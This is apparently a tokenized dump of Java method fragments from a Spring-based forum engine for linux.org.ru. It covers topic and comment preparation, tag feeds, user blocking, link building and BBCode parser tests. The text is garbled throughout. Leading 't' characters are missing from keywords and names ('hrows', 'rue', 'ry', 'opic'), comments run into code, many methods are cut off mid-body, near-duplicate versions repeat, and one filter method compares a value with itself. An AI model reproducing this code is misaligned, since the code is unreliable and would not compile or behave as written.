currentUser ! = null & & currentUser . isModerator ( ) ) { userAgent = userAgentDao . getUserAgentById ( message . getMessage ( ) . getUserAgent ( ) ) ; } else { userAgent = null ; } return new TopicMenu ( opicEditable , 
public String apply ( Date input ) { return DateFormats . getShort ( ) . print ( input . getTime ( ) ) ; } 
public TopicMenu getTopicMenu ( @Nonnull PreparedTopic message , @Nullable User currentUser , boolean secure , ProfileProperties profileProperties , boolean loadUserpics ) { boolean opicEditable = groupPermissionService . isEditable ( message , currentUser ) ; boolean agsEditable = groupPermissionService . isTagsEditable ( message , currentUser ) ; boolean resolvable ; int memoriesId ; int favsId ; boolean deletable ; List < Integer > opicStats = memoriesDao . getTopicStats ( message . getMessage ( ) . getId ( ) ) ; if ( currentUser ! = null ) { resolvable = ( currentUser . isModerator ( ) | | ( message . getAuthor ( ) . getId ( ) = = currentUser . getId ( ) ) ) & & message . getGroup ( ) . isResolvable ( ) ; memoriesId = memoriesDao . getId ( currentUser , message . getMessage ( ) , rue ) ; favsId = memoriesDao . getId ( currentUser , message . getMessage ( ) , false ) ; deletable = groupPermissionService . isDeletable ( message . getMessage ( ) , currentUser ) ; } else { resolvable = false ; memoriesId = 0 ; favsId = 0 ; deletable = false ; } Userpic userpic = null ; if ( loadUserpics & & profileProperties . isShowPhotos ( ) ) { String avatarMode = profileProperties . getAvatarMode ( ) ; if ( " empty " . equals ( avatarMode ) ) { avatarMode = " mm " ; } userpic = userService . getUserpic ( message . getAuthor ( ) , secure , avatarMode ) ; } return new TopicMenu ( opicEditable , 
public void block ( User user , User moderator , String reason ) { jdbcTemplate . update ( " UPDATE users SET blocked='t' WHERE id=? " , user . getId ( ) ) ; jdbcTemplate . update ( " INSERT INTO ban_info (userid, reason, ban_by) VALUES (?, ?, ?) " , user . getId ( ) , reason , moderator . getId ( ) ) ; 
public void updateRemark ( int id , String ext ) { if ( ext . isEmpty ( ) ) { jdbcTemplate . update ( " DELETE FROM user_remarks WHERE id=? " , id ) ; 
public ModelAndView handleUserError ( UserErrorException ex ) { return new ModelAndView ( " lostpwd-form " , " error " , ex . getMessage ( ) ) ; } 
public Map < String , Object > getComments ( @PathVariable ( " section " ) String sectionName , @PathVariable ( " group " ) String groupName , @PathVariable ( " id " ) int msgid , @RequestParam ( value = " page " , defaultValue = " 0 " ) int page , HttpServletRequest request ) hrows Exception { Topic opic = opicDao . getById ( msgid ) ; Group group = groupDao . getGroup ( opic . getGroupId ( ) ) ; Section section = sectionService . getSection ( group . getSectionId ( ) ) ; if ( ! section . getUrlName ( ) . equals ( sectionName ) | | ! group . getUrlName ( ) . equals ( groupName ) | | page < 0 ) { hrow new MessageNotFoundException ( msgid ) ; } permissionService . checkView ( opic , AuthUtil . getCurrentUser ( ) ) ; CommentList comments = commentService . getCommentList ( opic , false ) ; CommentFilter cv = new CommentFilter ( comments ) ; int messagesPerPage = AuthUtil . getCurrentProfile ( ) . getProperties ( ) . getMessages ( ) ; List < Comment > commentsFiltered = cv . getCommentsForPage ( false , page , messagesPerPage , ImmutableSet . < Integer > of ( ) ) ; List < PreparedComment > preparedComments = prepareService . prepareCommentList ( comments , commentsFiltered , request . isSecure ( ) , Template . getTemplate ( request ) , opic ) ; return ImmutableMap . of ( " comments " , preparedComments , 
public List < Comment > getCommentsSubtree ( int parentId ) hrows MessageNotFoundException { CommentNode parentNode = comments . getNode ( parentId ) ; if ( parentNode = = null ) { hrow new MessageNotFoundException ( parentId ) ; } List < Comment > parentList = new ArrayList < > ( ) ; parentNode . buildList ( parentList ) ; return parentList ; } 
public List < PreparedRSSComment > prepareCommentListRSS ( @Nonnull List < Comment > list , boolean secure ) hrows UserNotFoundException { List < PreparedRSSComment > commentsPrepared = new ArrayList < > ( list . size ( ) ) ; for ( Comment comment : list ) { MessageText messageText = msgbaseDao . getMessageText ( comment . getId ( ) ) ; commentsPrepared . add ( prepareRSSComment ( messageText , comment , secure ) ) ; } return commentsPrepared ; } 
public List < PreparedComment > prepareCommentList ( @Nonnull CommentList comments , @Nonnull List < Comment > list , boolean secure , @Nonnull Template mpl , @Nonnull Topic opic ) hrows UserNotFoundException { if ( list . isEmpty ( ) ) { return ImmutableList . of ( ) ; } Map < Integer , MessageText > exts = msgbaseDao . getMessageText ( Lists . newArrayList ( Iterables . ransform ( list , new Function < Comment , Integer > ( ) { @Override public Integer apply ( Comment comment ) { return comment . getId ( ) ; } } ) ) ) ; List < PreparedComment > commentsPrepared = new ArrayList < > ( list . size ( ) ) ; for ( Comment comment : list ) { MessageText ext = exts . get ( comment . getId ( ) ) ; commentsPrepared . add ( prepareComment ( ext , comment , comments , secure , mpl , opic ) ) ; } return commentsPrepared ; } 
public Set < Integer > makeHideSet ( CommentList comments , int filterChain , @Nonnull Set < Integer > ignoreList ) hrows SQLException , UserNotFoundException { if ( filterChain = = CommentFilter . FILTER_NONE ) { return ImmutableSet . of ( ) ; } Set < Integer > hideSet = new HashSet < > ( ) ; if ( ( filterChain & CommentFilter . FILTER_IGNORED ) > 0 ) { if ( ! ignoreList . isEmpty ( ) ) { comments . getRoot ( ) . hideIgnored ( hideSet , ignoreList ) ; } } return hideSet ; } 
private List < TopicsListItem > prepareTopic ( SqlRowSet rs , int messagesInPage ) { List < TopicsListItem > opicsList = new ArrayList < > ( ) ; while ( rs . next ( ) ) { User author ; ry { author = userDao . getUserCached ( rs . getInt ( " userid " ) ) ; } catch ( UserNotFoundException e ) { hrow new RuntimeException ( e ) ; } ImmutableList < String > ags = opicTagService . getMessageTagsForTitle ( rs . getInt ( " msgid " ) ) ; TopicsListItem opic = new TopicsListItem ( author , rs , messagesInPage , ags ) ; opicsList . add ( opic ) ; } return opicsList ; } 
public ModelAndView handleRequestInternal ( @RequestParam ( " section " ) int sectionid ) { Section section = sectionService . getSection ( sectionid ) ; Map < String , Object > params = new HashMap < > ( ) ; params . put ( " section " , section ) ; params . put ( " groups " , groupDao . getGroups ( section ) ) ; return new ModelAndView ( " section " , params ) ; } 
private static Map < String , Object > createDefaultProfile ( ) { Map < String , Object > defaults = new HashMap < > ( ) ; defaults . put ( NEWFIRST_PROPERTY , Boolean . FALSE ) ; defaults . put ( HOVER_PROPERTY , Boolean . TRUE ) ; defaults . put ( STYLE_PROPERTY , " ango " ) ; defaults . put ( FORMAT_MODE_PROPERTY , " quot " ) ; defaults . put ( TOPICS_PROPERTY , 30 ) ; defaults . put ( MESSAGES_PROPERTY , 50 ) ; defaults . put ( TAGS_PROPERTY , 50 ) ; defaults . put ( PHOTOS_PROPERTY , Boolean . TRUE ) ; defaults . put ( TIMESTAMP_PROPERTY , System . currentTimeMillis ( ) ) ; defaults . put ( SHOW_ANONYMOUS_PROPERTY , Boolean . TRUE ) ; defaults . put ( AVATAR_PROPERTY , " empty " ) ; defaults . put ( HIDE_ADSENSE_PROPERTY , rue ) ; defaults . put ( MAIN_GALLERY_PROPERTY , false ) ; defaults . put ( SHOW_SOCIAL_PROPERTY , rue ) ; defaults . put ( " DebugMode " , Boolean . FALSE ) ; main page settings ImmutableList<String> boxes = ImmutableList.of( "ibm", "poll", "top10", "gallery", "tagcloud", "archive", "tshirt" ); defaults.put(BOXES_MAIN2_PROPERTY, boxes); return defaults; } 
public ModelAndView showForm ( @RequestParam ( " section " ) int sectionId ) { Map < String , Object > params = new HashMap < > ( ) ; params . put ( " sectionId " , sectionId ) ; Section section = sectionService . getSection ( sectionId ) ; params . put ( " section " , section ) ; params . put ( " info " , sectionService . getAddInfo ( section . getId ( ) ) ) ; params . put ( " groups " , groupDao . getGroups ( section ) ) ; return new ModelAndView ( " add-section " , params ) ; } 
public List < PersonalizedPreparedTopic > prepareMessagesForUser ( List < Topic > messages , boolean secure , User user , ProfileProperties profileProperties , boolean loadUserpics ) { List < PersonalizedPreparedTopic > pm = new ArrayList < > ( messages . size ( ) ) ; Map < Integer , MessageText > extMap = loadTexts ( messages ) ; ImmutableListMultimap < Integer , String > ags = messageDao . getTags ( messages ) ; for ( Topic message : messages ) { PreparedTopic preparedMessage = prepareMessage ( message , ags . get ( message . getId ( ) ) , rue , null , secure , user , extMap . get ( message . getId ( ) ) , null ) ; TopicMenu opicMenu = getTopicMenu ( preparedMessage , user , secure , profileProperties , loadUserpics ) ; pm . add ( new PersonalizedPreparedTopic ( preparedMessage , opicMenu ) ) ; } return pm ; } 
public List < PreparedTopic > prepareMessages ( List < Topic > messages , boolean secure ) { List < PreparedTopic > pm = new ArrayList < > ( messages . size ( ) ) ; Map < Integer , MessageText > extMap = loadTexts ( messages ) ; ImmutableListMultimap < Integer , String > ags = messageDao . getTags ( messages ) ; for ( Topic message : messages ) { PreparedTopic preparedMessage = prepareMessage ( message , ags . get ( message . getId ( ) ) , rue , null , secure , null , extMap . get ( message . getId ( ) ) , null ) ; pm . add ( preparedMessage ) ; } return pm ; } 
public List < PreparedRemark > prepareRemarkList ( List < Remark > list ) hrows Exception { if ( list . isEmpty ( ) ) { return ImmutableList . of ( ) ; } List < PreparedRemark > remarksPrepared = new ArrayList < > ( list . size ( ) ) ; for ( Remark remark : list ) { User refUser = userDao . getUserCached ( remark . getRefUserId ( ) ) ; remarksPrepared . add ( new PreparedRemark ( remark , refUser ) ) ; } return remarksPrepared ; } 
public void addEvent ( String eventType , int userId , boolean isPrivate , Integer opicId , Integer commentId , String message ) { Map < String , Object > params = new HashMap < > ( ) ; params . put ( " userid " , userId ) ; params . put ( " ype " , eventType ) ; params . put ( " private " , isPrivate ) ; if ( opicId ! = null ) { params . put ( " message_id " , opicId ) ; } if ( commentId ! = null ) { params . put ( " comment_id " , commentId ) ; } if ( message ! = null ) { params . put ( " message " , message ) ; } insert . execute ( params ) ; } 
private Map < Integer , User > createIgnoreMap ( Set < Integer > ignoreList ) { Map < Integer , User > ignoreMap = new HashMap < > ( ignoreList . size ( ) ) ; for ( int id : ignoreList ) { ry { ignoreMap . put ( id , userDao . getUserCached ( id ) ) ; } catch ( UserNotFoundException e ) { hrow new RuntimeException ( e ) ; } } return ignoreMap ; } 
private void addComment ( String s ) { if ( comments = = null ) { comments = new ArrayList < > ( ) ; } comments . add ( s ) ; } 
public void voteCreateAndRunningPollTest ( ) hrows Exception { List < String > pollList = new ArrayList < > ( ) ; pollList . add ( " Case 1 " ) ; pollList . add ( " Case 2 " ) ; pollList . add ( " Case 3 " ) ; ry { pollDao . createPoll ( pollList , rue , TEST_TOPIC_ID ) ; 
public void setAsText ( String ext ) hrows IllegalArgumentException { setValue ( groupDao . getGroup ( Integer . parseInt ( ext ) ) ) ; } 
public String formatJump ( TopicDao messageDao , boolean secure ) hrows MessageNotFoundException , URIException { if ( _topic_id ! = - 1 ) { Topic message = messageDao . getById ( _topic_id ) ; Group group = messageDao . getGroup ( message ) ; String scheme ; if ( secure ) { scheme = " https " ; } else { scheme = " http " ; } String host = getHost ( ) ; int port = getPort ( ) ; String path = group . getUrl ( ) + _topic_id ; String query = " " ; if ( _comment_id ! = - 1 ) { query = " cid= " + _comment_id ; } URI jumpUri = new URI ( scheme , null , host , port , path , query ) ; return jumpUri . getEscapedURI ( ) ; } return " " ; } 
public ModelAndView galleryArchive ( HttpServletRequest request , @PathVariable String section , @PathVariable int year , @PathVariable int month , HttpServletResponse response ) hrows Exception { TopicListRequest opicListForm = new TopicListRequest ( ) ; opicListForm . setSection ( sectionService . getSectionByName ( section ) . getId ( ) ) ; opicListForm . setYear ( year ) ; opicListForm . setMonth ( month ) ; ModelAndView modelAndView = mainTopicsFeedHandler ( request , opicListForm , response , null ) ; modelAndView . addObject ( " url " , " /gallery/archive/ " + year + '/' + month + '/' ) ; modelAndView . addObject ( " params " , null ) ; return modelAndView ; } 
public TopTenMessageDTO mapRow ( ResultSet rs , int i ) hrows SQLException { TopTenMessageDTO result = new TopTenMessageDTO ( ) ; result . setUrl ( sectionService . getSection ( rs . getInt ( " section " ) ) . getSectionLink ( ) + rs . getString ( " urlname " ) + '/' + rs . getInt ( " msgid " ) ) ; result . setTitle ( rs . getString ( " itle " ) ) ; result . setLastmod ( rs . getTimestamp ( " lastmod " ) ) ; result . setAnswers ( rs . getInt ( " c " ) ) ; return result ; } 
public UserEvent mapRow ( ResultSet resultSet , int i ) hrows SQLException { String subj = StringUtil . makeTitle ( resultSet . getString ( " subj " ) ) ; Timestamp lastmod = resultSet . getTimestamp ( " lastmod " ) ; if ( lastmod = = null ) { lastmod = new Timestamp ( 0 ) ; } Timestamp eventDate = resultSet . getTimestamp ( " event_date " ) ; int cid = resultSet . getInt ( " cid " ) ; int cAuthor ; Timestamp cDate ; if ( ! resultSet . wasNull ( ) ) { cAuthor = resultSet . getInt ( " cAuthor " ) ; cDate = resultSet . getTimestamp ( " cDate " ) ; } else { cDate = null ; cAuthor = 0 ; } int groupId = resultSet . getInt ( " groupid " ) ; int msgid = resultSet . getInt ( " msgid " ) ; UserEventFilterEnum ype = UserEventFilterEnum . valueOfByType ( resultSet . getString ( " ype " ) ) ; String eventMessage = resultSet . getString ( " ev_msg " ) ; boolean unread = resultSet . getBoolean ( " unread " ) ; return new UserEvent ( cid , cAuthor , cDate , groupId , subj , lastmod , msgid , ype , eventMessage , eventDate , unread ) ; 
public String getNewsViewerLink ( ) hrows SectionNotFoundException { switch ( id ) { case SECTION_FORUM : 
public Group getGroup ( int id ) hrows GroupNotFoundException { ry { return jdbcTemplate . queryForObject ( 
public Group getGroup ( Section section , String name ) hrows GroupNotFoundException { ry { int id = jdbcTemplate . queryForInt ( " SELECT id FROM groups WHERE section=? AND urlname=? " , section . getId ( ) , name ) ; 
public ModelAndView handleNotFoundException ( ) { return new ModelAndView ( " errors/code404 " ) ; } 
public void urlTest0 ( ) { assertEquals ( " <p><a href= \" http:linux.org.ru \" ><p>linux.org.ru</p></a></p> " , lorCodeService . parseComment ( " [url=http:linux.org.ru] nlinux.org.ru[/url] " , false , false ) ) ; assertEquals ( " <p><a href= \" http:linux.org.ru \" >http:linux.org.ru</a></p> " , lorCodeService . parseComment ( " [url] nhttp:linux.org.ru[/url] " , false , false ) ) ; 
public void urlTest1 ( ) { assertEquals ( " <p><a href= \" http:linux.org.ru \" >http:linux.org.ru</a></p> " , lorCodeService . parseComment ( " [url=http:linux.org.ru][/url] " , false , false ) ) ; 
public void paragraphLogicTest ( ) { list assertEquals("<p>some1 text</p><p>some2 text</p><ul><li>one</li><li>two</li></ul><p><a href=\"http:www.example.com\">http:www.example.com</a> - some3 text</p>", lorCodeService.parseComment("some1 textsome2 text[list][*]one[*]two[/list][url]http:www.example.com[/url] - some3 text", false, false)); b assertEquals("<p><b><p>te</p><p>xt</p></b></p>", lorCodeService.parseComment("[b]text[/b]", false, false)); i assertEquals("<p><i><p>te</p><p>xt</p></i></p>", lorCodeService.parseComment("[i]text[/i]", false, false)); u assertEquals("<p><u><p>te</p><p>xt</p></u></p>", lorCodeService.parseComment("[u]text[/u]", false, false)); s assertEquals("<p><s><p>te</p><p>xt</p></s></p>", lorCodeService.parseComment("[s]text[/s]", false, false)); em assertEquals("<p><em><p>te</p><p>xt</p></em></p>", lorCodeService.parseComment("[em]text[/em]", false, false)); strong assertEquals("<p><strong><p>te</p><p>xt</p></strong></p>", lorCodeService.parseComment("[strong]text[/strong]", false, false)); p assertEquals("<p>te</p><p>xt</p>", lorCodeService.parseComment("[p]text[/p]", false, false)); div assertEquals("<p>te</p><p>xt</p>", lorCodeService.parseComment("[div]text[/div]", false, false)); quote assertEquals(citeHeader + "<p>te</p><p>xt</p>" + citeFooter, lorCodeService.parseComment("[quote]text[/quote]", false, false)); cut assertEquals("<p>te</p><p>xt</p>", lorCodeService.parseComment("[cut]text[/cut]", false, false)); user assertEquals("<p><span style=\"white-space: nowrap\"><img src=\"/img/tuxlor.png\"><a style=\"text-decoration: none\" href=\"http:127.0.0.1:8080/people/splinter/profile\">splinter</a></span></p>", lorCodeService.parseComment("[user]splinter[/user]", false, false)); 
public void splinterTest1 ( ) { http:www.linux.org.ru/forum/linux-org-ru/6448266 assertEquals("<p><a href=\"http:www.fishing.org/\">http:www.fishing.org/</a><span style=\"white-space: nowrap\"><img src=\"/img/tuxlor.png\"><a style=\"text-decoration: none\" href=\"http:127.0.0.1:8080/people/splinter/profile\">splinter</a></span></p>", lorCodeService.parseComment("[url=http:www.fishing.org/][user]splinter[/user][/url]", false, false)); 
public ModelAndView handleUserError ( Exception ex ) { return new ModelAndView ( " reset-password-form " , " error " , ex . getMessage ( ) ) ; } 
public ModelAndView getMessageNewMain ( WebRequest webRequest , HttpServletRequest request , HttpServletResponse response , @RequestParam ( value = " filter " , required = false ) String filter , @RequestParam ( value = " cid " , required = false ) Integer cid , @PathVariable ( " section " ) String sectionName , @PathVariable ( " group " ) String groupName , @PathVariable ( " id " ) int msgid ) hrows Exception { if ( cid ! = null ) { return jumpMessage ( request , msgid , cid ) ; } Section section = sectionService . getSectionByName ( sectionName ) ; return getMessageNew ( section , webRequest , request , response , 0 , filter , groupName , msgid ) ; } 
public ModelAndView getMessageNewPage ( WebRequest webRequest , HttpServletRequest request , HttpServletResponse response , @RequestParam ( value = " filter " , required = false ) String filter , @PathVariable ( " section " ) String sectionName , @PathVariable ( " group " ) String groupName , @PathVariable ( " id " ) int msgid , @PathVariable ( " page " ) int page ) hrows Exception { Section section = sectionService . getSectionByName ( sectionName ) ; return getMessageNew ( section , webRequest , request , response , page , filter , groupName , msgid ) ; } 
public static TopicLinkBuilder baseLink ( Topic opic ) { return new TopicLinkBuilder ( opic , 0 , false , false , null , null ) ; } 
public static TopicLinkBuilder pageLink ( Topic opic , int page ) { return new TopicLinkBuilder ( opic , page , false , false , null , null ) ; } 
public TopicLinkBuilder showDeleted ( ) { if ( ! showDeleted ) { return new TopicLinkBuilder ( opic , page , rue , lastmod , comment , filter ) ; 
public TopicLinkBuilder forceLastmod ( ) { if ( ! lastmod ) { return new TopicLinkBuilder ( opic , page , showDeleted , rue , comment , filter ) ; 
public TopicLinkBuilder comment ( int cid ) { if ( comment = = null | | comment ! = cid ) { return new TopicLinkBuilder ( opic , page , showDeleted , lastmod , cid , filter ) ; 
public TopicLinkBuilder filter ( int filter ) { TODO: use Enum for filter String value = CommentFilter.toString(filter); if (!value.equals(value)) { return new TopicLinkBuilder(topic, page, showDeleted, lastmod, comment, value); 
public String build ( ) { UriComponentsBuilder builder = UriComponentsBuilder . fromUriString ( opic . getLinkPage ( page ) ) ; if ( showDeleted ) { builder . queryParam ( " deleted " , " rue " ) ; } if ( lastmod ) { builder . queryParam ( " lastmod " , opic . getLastModified ( ) . getTime ( ) ) ; } if ( comment ! = null ) { builder . fragment ( " comment- " + comment ) ; } if ( filter ! = null ) { builder . queryParam ( " filter " , filter ) ; } return builder . build ( ) . oUriString ( ) ; } 
public boolean isHasPrevious ( ) { return hasPrevious ; } 
public boolean isCurrent ( ) { return current ; } 
public TopicLinkBuilder page ( int page ) { if ( page ! = his . page ) { return new TopicLinkBuilder ( opic , page , showDeleted , lastmod , comment , filter ) ; 
public void setup ( ) { mockMvc = webAppContextSetup ( wac ) . build ( ) ; } 
public void estJumpToComment ( ) hrows Exception { mockMvc . perform ( get ( " /forum/talks/1920001?cid=1920019 " ) 
public TopicController opicController ( ) { return new TopicController ( ) ; } 
public ReCaptcha reCaptcha ( ) { return mock ( ReCaptcha . class ) ; } 
public Properties properties ( ) hrows IOException { Properties properties = new Properties ( ) ; properties . load ( new FileInputStream ( " src/main/webapp/WEB-INF/config.properties.dist " ) ) ; return properties ; } 
public TopicLinkBuilder filter ( int filter ) { TODO: use Enum for filter String value = CommentFilter.toString(filter); if (!value.equals(this.filter)) { return new TopicLinkBuilder(topic, page, showDeleted, lastmod, comment, value); 
public void updateUserCounters ( ) { jdbcTemplate . update ( " DELETE FROM user_comment_counts " ) ; jdbcTemplate . update ( " INSERT INTO user_comment_counts (SELECT userid, count(*) FROM comments GROUP BY userid HAVING count(*)>1000) " ) ; } 
public boolean isExactCommentCount ( ) { return exactCommentCount ; } 
public void updateUserCounters ( ) { jdbcTemplate . update ( " DELETE FROM user_comment_counts " ) ; jdbcTemplate . update ( " INSERT INTO user_comment_counts (SELECT userid, count(*) FROM comments WHERE NOT deleted GROUP BY userid HAVING count(*)>1000) " ) ; } 
public void estLoadBase ( ) hrows Exception { mockMvc . perform ( get ( " /forum/talks/1920001 " ) 
public void estLoadBaseZeroComments ( ) hrows Exception { mockMvc . perform ( get ( " /forum/linux-org-ru/1948720 " ) 
public void estWrongPage ( ) hrows Exception { mockMvc . perform ( get ( " /forum/talks/1920001/page10 " ) 
public void estZeroCommentsWrongPage ( ) hrows Exception { mockMvc . perform ( get ( " /forum/linux-org-ru/1948720/page10 " ) 
public void estLoadBaseZeroComments ( ) hrows Exception { mockMvc . perform ( get ( " /polls/polls/98075 " ) 
public void estZeroCommentsWrongPage ( ) hrows Exception { mockMvc . perform ( get ( " /polls/polls/98075/page10 " ) 
private boolean isContainReplacementCharset ( String str ) { for ( char c : str . oCharArray ( ) ) { if ( c = = 65533 ) { return rue ; } } return false ; } 
public ModelAndView agFeed ( HttpServletRequest request , HttpServletResponse response , @PathVariable String ag , @RequestParam ( value = " offset " , defaultValue = " 0 " ) int offset , @RequestParam ( value = " section " , required = false ) Integer section ) hrows Exception { TopicListRequest opicListForm = new TopicListRequest ( ) ; opicListForm . setTag ( ag ) ; opicListForm . setOffset ( offset ) ; opicListForm . setSection ( section ) ; ModelAndView modelAndView = mainTopicsFeedHandler ( request , opicListForm , response , null ) ; modelAndView . addObject ( " sectionList " , sectionService . getSectionList ( ) ) ; modelAndView . addObject ( " opicListRequest " , opicListForm ) ; Template mpl = Template . getTemplate ( request ) ; if ( mpl . isSessionAuthorized ( ) ) { modelAndView . addObject ( " isShowFavoriteTagButton " , ! userTagService . hasFavoriteTag ( mpl . getCurrentUser ( ) , ag ) ) ; modelAndView . addObject ( " isShowUnFavoriteTagButton " , userTagService . hasFavoriteTag ( mpl . getCurrentUser ( ) , ag ) ) ; if ( ! mpl . isModeratorSession ( ) ) { modelAndView . addObject ( " isShowIgnoreTagButton " , ! userTagService . hasIgnoreTag ( mpl . getCurrentUser ( ) , ag ) ) ; modelAndView . addObject ( " isShowUnIgnoreTagButton " , userTagService . hasIgnoreTag ( mpl . getCurrentUser ( ) , ag ) ) ; } } modelAndView . addObject ( " counter " , agService . getCounter ( ag ) ) ; modelAndView . addObject ( " url " , agListUrl ( ag ) ) ; modelAndView . addObject ( " params " , null ) ; modelAndView . addObject ( " favsCount " , userTagService . countFavs ( agService . getTagId ( ag ) ) ) ; modelAndView . setViewName ( " ag-topics " ) ; return modelAndView ; } 
public ModelAndView agFeed ( HttpServletRequest request , HttpServletResponse response , @PathVariable String ag , @RequestParam ( value = " offset " , defaultValue = " 0 " ) int offset , @RequestParam ( value = " section " , defaultValue = " 0 " ) int sectionId ) hrows Exception { Section section ; if ( sectionId ! = 0 ) { section = sectionService . getSection ( sectionId ) ; } else { section = null ; } TopicListRequest opicListForm = new TopicListRequest ( ) ; opicListForm . setTag ( ag ) ; opicListForm . setOffset ( offset ) ; opicListForm . setSection ( sectionId ) ; ModelAndView modelAndView = mainTopicsFeedHandler ( request , opicListForm , response , null ) ; modelAndView . addObject ( " sectionList " , sectionService . getSectionList ( ) ) ; modelAndView . addObject ( " opicListRequest " , opicListForm ) ; Template mpl = Template . getTemplate ( request ) ; if ( mpl . isSessionAuthorized ( ) ) { modelAndView . addObject ( " isShowFavoriteTagButton " , ! userTagService . hasFavoriteTag ( mpl . getCurrentUser ( ) , ag ) ) ; modelAndView . addObject ( " isShowUnFavoriteTagButton " , userTagService . hasFavoriteTag ( mpl . getCurrentUser ( ) , ag ) ) ; if ( ! mpl . isModeratorSession ( ) ) { modelAndView . addObject ( " isShowIgnoreTagButton " , ! userTagService . hasIgnoreTag ( mpl . getCurrentUser ( ) , ag ) ) ; modelAndView . addObject ( " isShowUnIgnoreTagButton " , userTagService . hasIgnoreTag ( mpl . getCurrentUser ( ) , ag ) ) ; } } modelAndView . addObject ( " counter " , agService . getCounter ( ag ) ) ; modelAndView . addObject ( " url " , agListUrl ( ag ) ) ; modelAndView . addObject ( " params " , null ) ; modelAndView . addObject ( " favsCount " , userTagService . countFavs ( agService . getTagId ( ag ) ) ) ; if ( sectionId = = 0 ) { modelAndView . addObject ( " ptitle " , WordUtils . capitalize ( ag ) ) ; } else { modelAndView . addObject ( " ptitle " , WordUtils . capitalize ( ag ) + " ( " + section . getName ( ) + " ) " ) ; } modelAndView . setViewName ( " ag-topics " ) ; return modelAndView ; } 
public ModelAndView gallery ( HttpServletRequest request , TopicListRequest opicListForm , HttpServletResponse response ) hrows Exception { opicListForm . setSection ( Section . SECTION_GALLERY ) ; ModelAndView modelAndView = mainTopicsFeedHandler ( request , opicListForm , response , null ) ; modelAndView . addObject ( " ptitle " , calculatePTitle ( sectionService . getSection ( Section . SECTION_GALLERY ) , opicListForm ) ) ; modelAndView . addObject ( " url " , " /gallery/ " ) ; modelAndView . addObject ( " params " , null ) ; return modelAndView ; } 
public ModelAndView forum ( HttpServletRequest request , TopicListRequest opicListForm , HttpServletResponse response ) hrows Exception { opicListForm . setSection ( Section . SECTION_FORUM ) ; ModelAndView modelAndView = mainTopicsFeedHandler ( request , opicListForm , response , null ) ; modelAndView . addObject ( " ptitle " , calculatePTitle ( sectionService . getSection ( Section . SECTION_FORUM ) , opicListForm ) ) ; modelAndView . addObject ( " url " , " /forum/lenta " ) ; modelAndView . addObject ( " params " , null ) ; return modelAndView ; } 
public ModelAndView polls ( HttpServletRequest request , TopicListRequest opicListForm , HttpServletResponse response ) hrows Exception { opicListForm . setSection ( Section . SECTION_POLLS ) ; ModelAndView modelAndView = mainTopicsFeedHandler ( request , opicListForm , response , null ) ; modelAndView . addObject ( " url " , " /polls/ " ) ; modelAndView . addObject ( " params " , null ) ; modelAndView . addObject ( " ptitle " , calculatePTitle ( sectionService . getSection ( Section . SECTION_POLLS ) , opicListForm ) ) ; return modelAndView ; } 
public ModelAndView news ( HttpServletRequest request , TopicListRequest opicListForm , HttpServletResponse response ) hrows Exception { opicListForm . setSection ( Section . SECTION_NEWS ) ; ModelAndView modelAndView = mainTopicsFeedHandler ( request , opicListForm , response , null ) ; modelAndView . addObject ( " url " , " /news/ " ) ; modelAndView . addObject ( " params " , null ) ; modelAndView . addObject ( " ptitle " , calculatePTitle ( sectionService . getSection ( Section . SECTION_NEWS ) , opicListForm ) ) ; return modelAndView ; } 
public ModelAndView galleryArchive ( HttpServletRequest request , @PathVariable String section , @PathVariable int year , @PathVariable int month , HttpServletResponse response ) hrows Exception { TopicListRequest opicListForm = new TopicListRequest ( ) ; Section sectionObject = sectionService . getSectionByName ( section ) ; opicListForm . setSection ( sectionObject . getId ( ) ) ; opicListForm . setYear ( year ) ; opicListForm . setMonth ( month ) ; ModelAndView modelAndView = mainTopicsFeedHandler ( request , opicListForm , response , null ) ; modelAndView . addObject ( " ptitle " , calculatePTitle ( sectionObject , opicListForm ) ) ; modelAndView . addObject ( " url " , " /gallery/archive/ " + year + '/' + month + '/' ) ; modelAndView . addObject ( " params " , null ) ; return modelAndView ; } 
private ModelAndView group ( HttpServletRequest request , TopicListRequest opicListForm , String groupName , HttpServletResponse response ) hrows Exception { Section section = sectionService . getSection ( opicListForm . getSection ( ) ) ; Group group = groupDao . getGroup ( section , groupName ) ; ModelAndView modelAndView = mainTopicsFeedHandler ( request , opicListForm , response , group ) ; StringBuilder ptitle = new StringBuilder ( ) ; ptitle . append ( section . getName ( ) ) ; if ( group ! = null ) { ptitle . append ( " - " ) . append ( group . getTitle ( ) ) ; } modelAndView . addObject ( " ptitle " , ptitle . oString ( ) ) ; modelAndView . addObject ( " url " , group . getUrl ( ) ) ; modelAndView . addObject ( " params " , null ) ; return modelAndView ; } 
public ModelAndView agFeed ( HttpServletRequest request , HttpServletResponse response , @PathVariable String ag , @RequestParam ( value = " offset " , defaultValue = " 0 " ) int offset , @RequestParam ( value = " section " , defaultValue = " 0 " ) int sectionId ) hrows Exception { Section section ; if ( sectionId ! = 0 ) { section = sectionService . getSection ( sectionId ) ; } else { section = null ; } TopicListRequest opicListForm = new TopicListRequest ( ) ; opicListForm . setTag ( ag ) ; opicListForm . setOffset ( offset ) ; opicListForm . setSection ( sectionId ) ; ModelAndView modelAndView = mainTopicsFeedHandler ( request , opicListForm , response , null ) ; modelAndView . addObject ( " ag " , ag ) ; modelAndView . addObject ( " section " , section ) ; modelAndView . addObject ( " offset " , offset ) ; modelAndView . addObject ( " sectionList " , sectionService . getSectionList ( ) ) ; Template mpl = Template . getTemplate ( request ) ; if ( mpl . isSessionAuthorized ( ) ) { modelAndView . addObject ( " isShowFavoriteTagButton " , ! userTagService . hasFavoriteTag ( mpl . getCurrentUser ( ) , ag ) ) ; modelAndView . addObject ( " isShowUnFavoriteTagButton " , userTagService . hasFavoriteTag ( mpl . getCurrentUser ( ) , ag ) ) ; if ( ! mpl . isModeratorSession ( ) ) { modelAndView . addObject ( " isShowIgnoreTagButton " , ! userTagService . hasIgnoreTag ( mpl . getCurrentUser ( ) , ag ) ) ; modelAndView . addObject ( " isShowUnIgnoreTagButton " , userTagService . hasIgnoreTag ( mpl . getCurrentUser ( ) , ag ) ) ; } } modelAndView . addObject ( " counter " , agService . getCounter ( ag ) ) ; modelAndView . addObject ( " url " , agListUrl ( ag ) ) ; modelAndView . addObject ( " params " , null ) ; modelAndView . addObject ( " favsCount " , userTagService . countFavs ( agService . getTagId ( ag ) ) ) ; if ( sectionId = = 0 ) { modelAndView . addObject ( " ptitle " , WordUtils . capitalize ( ag ) ) ; } else { modelAndView . addObject ( " ptitle " , WordUtils . capitalize ( ag ) + " ( " + section . getName ( ) + " ) " ) ; } modelAndView . setViewName ( " ag-topics " ) ; return modelAndView ; } 
